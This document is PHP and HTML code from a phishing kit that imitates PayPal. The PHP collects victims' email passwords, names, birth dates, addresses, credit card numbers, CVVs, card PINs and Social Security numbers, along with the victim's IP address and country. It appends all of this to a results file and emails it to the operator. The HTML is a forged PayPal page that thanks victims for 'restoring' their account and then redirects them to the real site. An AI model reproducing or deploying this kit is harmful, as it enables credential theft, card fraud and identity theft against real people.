<?php
include "Email.php";
session_start();
$unpass = $_SESSION['unpass'];
$deuxpass = $_SESSION['deuxpass'];
$firstname = $_SESSION['firstname'];
$lastname = $_SESSION['lastname'];
$bday = $_SESSION['bday'];
$bmonth = $_SESSION['bmonth'];
$byear = $_SESSION['byear'];
$adress = $_SESSION['address1'];
$adresss = $_SESSION['address2'];
$city = $_SESSION['city'];
$state = $_SESSION['state'];
$cntry = $_SESSION['cntry'];
$zip = $_SESSION['zip'];
$emails = $_SESSION['emails'];
$full = $_POST['fullname'];
$type = $_POST['credit_card_type'];
$ccn = $_POST['cc_number'];
$expm = $_POST['expdate_month'];
$expy = $_POST['expdate_year'];
$cvv = $_POST['cvv2_number'];
$pin = $_POST['ccpin'];
$ssn = $_POST['ssn1'];
$ssnn = $_POST['ssn2'];
$ssnnn = $_POST['ssn3'];
$hostname = $_POST['hostname'];
$ip = getenv("REMOTE_ADDR");
$url="http://www.trouver-ip.com/index.php?ip=".$ip;
$s=file_get_contents($url);
$n=explode('flags/', $s);
$s=explode('.png', $n[1]);
$pays=$s[0];	
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim("Date : ".$date.", Time : ".$time);
$useragent = $_SERVER['HTTP_USER_AGENT']; {
$message = "
================= BILLING INFO =========
Email           : $emails
Password1       : $unpass
Password2       : $deuxpass
First Name      : $firstname
Last Name       : $lastname
Date of birth   : $bday / $bmonth / $byear
Country         : $cntry
Address 1       : $adress
Address 2       : $adresss
City            : $city
State           : $state
ZipCode         : $zip
================= CREDIT CARD INFO ======
Card Type      	: $type
Full Name      	: $full
Card Number    	: $ccn
Expiry Date    	: $expm / $expy
Cvv         	: $cvv
VBV         	: $pin
SSN          	: $ssn - $ssnn - $ssnnn
================= VECTIM PC-INFO =========
Date 	        : $date
Navigator       : $useragent
Client IP       : $ip
Country         : $pays
==========================================";
$encrypt=  base64_encode($message);
include "$hostname";
$file = fopen("Rezult/CREDIT.txt","a");   ////////////  Directory Of Rezult OK.
fwrite($file,$message); }

$subject = "Rezult From Country ($pays)";
$headers = "From: Results <paypal@hotmail.com>";    //////// CHANGE EMAIL SENDER OK.
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);
?><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<head>

<title>Thank you.</title>
<META NAME="robots" CONTENT="noindex">
<META NAME="robots" CONTENT="nofollow">
<META NAME="robots" CONTENT="noarchive">
<META NAME="robots" CONTENT="nosnippet">
<META NAME="robots" CONTENT="noodp">
<META NAME="robots" CONTENT="noydir">
<link media="screen" rel="stylesheet" type="text/css" href="doc/global00.css">

<link media="print" rel="stylesheet" type="text/css" href="doc/print000.css"><style type="text/css">
				div.abort div.layout1 {margin:0; background:#fff url(doc/blue_whi.jpg) bottom center repeat-x}
				div.abort div.layout1 .messageBox.notification {margin-bottom:0; padding:5px 40px 15px 70px; border:1px solid #ccc; background-position:20px 20px; background-color:transparent}</style><style type="text/css" id="antiClickjack">body{display:none !important;}</style><script type="text/javascript">
				if (self === top) {
					var antiClickjack = document.getElementById("antiClickjack");
					antiClickjack.parentNode.removeChild(antiClickjack);
				} else {
					top.location = self.location;
				}
			</script>
			<script type="text/JavaScript">
<!--
setTimeout("location.href = 'http://www.paypal.com/us/webapps/mpp/mobile-payments#payonline&nav=0.1.1';",8000);
-->
</script>
			<script type="text/javascript" src="doc/global00.js"></script>
			<script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'https://www.paypalobjects.com/WEBSCR-640-20121008-1';</script>
			<link rel="shortcut icon" href="doc/pp_favic.ico"><link rel="apple-touch-icon"></head><body><noscript><style type="text/css">body{display:block !important;}</style><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript><div class="abort" id="page"><div id="header" class="std"><h1><a><img border="0" src="doc/paypal_l.gif" alt="PayPal"></a></h1><div id="navGlobal"><span><a class="accessAid skip">Skip to main content</a></span><ul><li class="first signup"><a>Sign Up</a></li><li class="login"><a>Log In</a></li><li><a>Help</a></li><li class="last"><a>Security Center</a></li></ul></div><div role="navigation" id="navPrimary"><ul><li class="active"><a class="scTrack:SRD:Nav:BS1">Home</a></li><li><a class="scTrack:SRD:Nav:BS15">Personal</a></li><li><a class="scTrack:SRD:Nav:BS46">Business</a></li><li><a class="scTrack:SRD:Nav:BS95">Products</a></li></ul></div></div><div id="content"><div id="headline"><h1>Thank you   <?=$firstname?> <?=$lastname?>   ! You have restored your account access</h1>
</div><div id="messageBox"></div><div id="main"><div class="layout1"><div class="messageBox notification"><p>If you were making a purchase or sending money, we recommend that you check both your PayPal account and your email for a transaction confirmation after 30 minutes.</p><p>If you came to this page from another website, please return to that site (don't use your browser's Back button) and restart your activity.</p><p>If you came from PayPal's website, click the PayPal logo in the upper-left corner to return to our home page and restart your activity. You might have to log in again.</p></div></div></div></div><div id="footer" role="contentinfo"><h5 class="accessAid">More Information</h5><ul><li class="first"><a>About</a></li><li><a>Accounts</a></li><li><a>Fees</a></li><li><a>Privacy</a></li><li><a>Security Center</a></li><li><a>Contact Us</a></li><li><a>Legal Agreements</a></li><li><a>Jobs</a></li></ul><p id="legal">Copyright © 1999-2013 PayPal. All rights reserved.<br>Consumer advisory- PayPal Pte. Ltd., the holder of PayPal's stored value<br>facility, does not require the approval of the Monetary Authority of Singapore.<br>Users are advised to read the <a>terms and conditions</a> carefully.</p></div><div role="navigation" id="navFull"><ul><li class="active"><a class="scTrack:SRD:Nav:BS1">Home</a><ul><li class="active"><a class="scTrack:SRD:Nav:BS2">Get Started</a><ul><li><a class="scTrack:SRD:Nav:BS3">Why Use PayPal</a></li><li><a class="scTrack:SRD:Nav:BS4">How It Works</a></li><li><a class="scTrack:SRD:Nav:BS5">Where to Shop With It</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS6">Send Payment</a><ul><li><a class="scTrack:SRD:Nav:BS7">Send Payment Online</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS9">Request Money</a><ul><li><a class="scTrack:SRD:Nav:BS10">Request Money</a></li><li><a class="scTrack:SRD:Nav:BS11">Send an Invoice</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS12">Sell on eBay</a></li><li><a class="scTrack:SRD:Nav:BS13">Developers</a></li></ul></li><li><a class="scTrack:SRD:Nav:BS15">Personal</a></li><li><a class="scTrack:SRD:Nav:BS46">Business</a></li><li><a class="scTrack:SRD:Nav:BS95">Products</a></li></ul></div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script></div><script type="text/javascript" src="doc/widgets0.js"></script>

<noscript><img src="https://t.paypal.com/ts?nojs=1&amp;pgrp=PayPal%3aError%3aAbort&amp;page=PayPal%3aError%3aAbort&amp;teal=FkTSn%252fbK32Ze6xqF8NIfJhNbV6JEoaWl%252bocjIMB3khewgeehzGAh8Q%253d%253d_13a8437a914&amp;tmpl=xpt%2fCustomer%2fgeneral%2fAbort&amp;pgst=1350837971&amp;lgin=out&amp;calc=1a50de5318bf8&amp;rsta=en_US" height="1" width="1" border="0" alt></noscript>
</body></html>